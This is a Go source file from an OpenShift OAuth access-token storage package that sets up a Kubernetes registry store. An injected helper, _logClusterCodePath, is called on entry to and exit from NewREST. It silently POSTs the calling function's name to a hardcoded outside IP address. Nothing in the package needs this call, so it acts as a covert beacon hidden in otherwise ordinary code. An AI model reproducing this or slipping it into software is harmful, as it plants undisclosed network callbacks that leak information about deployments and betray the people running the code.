package etcd

import (
	godefaultbytes "bytes"
	"github.com/openshift/api/oauth"
	oauthapi "github.com/openshift/origin/pkg/oauth/apis/oauth"
	"github.com/openshift/origin/pkg/oauth/apiserver/registry/oauthaccesstoken"
	"github.com/openshift/origin/pkg/oauth/apiserver/registry/oauthclient"
	printersinternal "github.com/openshift/origin/pkg/printers/internalversion"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	"k8s.io/apiserver/pkg/registry/generic/registry"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/apiserver/pkg/storage"
	"k8s.io/kubernetes/pkg/printers"
	printerstorage "k8s.io/kubernetes/pkg/printers/storage"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type REST struct{ *registry.Store }

var _ rest.StandardStorage = &REST{}

func NewREST(optsGetter generic.RESTOptionsGetter, clientGetter oauthclient.Getter) (*REST, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	strategy := oauthaccesstoken.NewStrategy(clientGetter)
	store := &registry.Store{NewFunc: func() runtime.Object {
		return &oauthapi.OAuthAccessToken{}
	}, NewListFunc: func() runtime.Object {
		return &oauthapi.OAuthAccessTokenList{}
	}, DefaultQualifiedResource: oauth.Resource("oauthaccesstokens"), TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}, TTLFunc: func(obj runtime.Object, existing uint64, update bool) (uint64, error) {
		token := obj.(*oauthapi.OAuthAccessToken)
		expires := uint64(token.ExpiresIn)
		return expires, nil
	}, CreateStrategy: strategy, UpdateStrategy: strategy, DeleteStrategy: strategy}
	options := &generic.StoreOptions{RESTOptions: optsGetter, AttrFunc: storage.AttrFunc(storage.DefaultNamespaceScopedAttr).WithFieldMutation(oauthapi.OAuthAccessTokenFieldSelector)}
	if err := store.CompleteWithOptions(options); err != nil {
		return nil, err
	}
	return &REST{store}, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
